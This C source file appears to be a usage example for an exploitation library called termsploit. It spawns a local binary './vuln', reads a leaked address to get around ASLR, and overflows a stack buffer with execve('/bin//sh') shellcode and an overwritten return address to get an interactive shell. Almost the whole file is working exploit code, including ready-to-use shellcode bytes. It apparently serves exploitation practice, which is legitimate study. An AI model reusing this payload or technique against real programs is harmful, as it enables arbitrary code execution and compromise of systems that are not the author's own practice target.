// Simple example exploit:
// - ASLR bypass using an address leak
// - Shellcode on an executable stack
#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <signal.h>
#include <string.h>
#include <termsploit.h>

static char shellcode[] = \
	"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05";

static uint64_t leakaddr(termsploit_ctx *ctx)
{
	char *line, *p;
	uint64_t addr;

	// Read leak
	line = termsploit_getline(ctx);
	p = strstr(line, "0x");
	if (!p) abort();
	// Convert to uint
	addr = strtoul(p + 2, NULL, 16);
	free(line);
	return addr;
}

int main(void)
{
	termsploit_ctx *ctx;
	uint64_t retaddr;
	char buf[4096];
	size_t bufsize;
	int exitcode;

	ctx = termsploit_alloc();
	if (termsploit_spawn(ctx, (char *[]) { "./vuln", NULL }) < 0) {
		perror("spawn");
		return 1;
	}

	// Get return address
	retaddr = leakaddr(ctx);
	// printf("Return address: %lx\n", retaddr);

	// Prepare payload
	memset(buf, 'A', sizeof buf);
	bufsize = 0;
	// Add shellcode
	memcpy(buf, shellcode, sizeof shellcode);
	bufsize += sizeof shellcode;
	// Add return address
	bufsize += (0x28 - bufsize);
	memcpy(buf + 0x28, &retaddr, sizeof retaddr);
	bufsize += 8;
	// Add newline
	buf[bufsize++] = '\n';

	// Send payload
	termsploit_write(ctx, buf, bufsize);
	// Got a shell?!
	termsploit_interactive(ctx);

	exitcode = termsploit_wait(ctx);
	printf("Process exited with %d\n", exitcode);

	termsploit_free(ctx);
	return 0;
}
